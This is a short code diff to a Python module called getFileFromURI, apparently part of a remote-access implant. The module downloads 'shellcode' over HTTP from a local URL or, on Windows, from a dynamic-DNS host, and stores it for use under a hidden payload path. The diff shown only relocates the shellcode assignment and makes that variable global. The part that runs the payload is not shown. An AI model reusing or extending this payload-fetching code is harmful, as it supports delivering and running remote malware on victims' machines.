@@ -26,13 +26,13 @@ bin = False
 ScriptExec = "python3.5 "
 url = "http://127.0.0.1:8000/TCP_client.py"
 OsTargetpath = ".payload_posix"
-
+shellcode = ""
 start = True #To decide entweder an oder aus die Zugriff
 
 def run(**args):
   #os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
   print('[*] In getFileFromURI module.')
-  global bin, url, ScriptExec, OsTargetpath
+  global bin, url, ScriptExec, OsTargetpath, shellcode
   if os.name == 'nt':
       bin = True
       url = "http://saw-dsr.ddns.net:8000/test"
@@ -49,6 +49,7 @@ def run(**args):
     http = urllib3.PoolManager()
     #The HTTPResponse object provides status, data, and header attributes:
     r = http.request('GET', url)
+    shellcode = r.data.decode('utf-8')
   except urllib3.exceptions.MaxRetryError:
   	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
   	return "getFileFromURI: HTTP Error 404: File not found"
@@ -56,8 +57,6 @@ def run(**args):
   	#os.system("echo '<urlopen error [Errno 111] Connection refused>' >> .Tlog.log")
   	return "getFileFromURI: Connection refused"
 
-
-  shellcode = r.data.decode('utf-8')
   #The data attribute of the response is always set to a byte string representing the response content
   cmd = ""
 
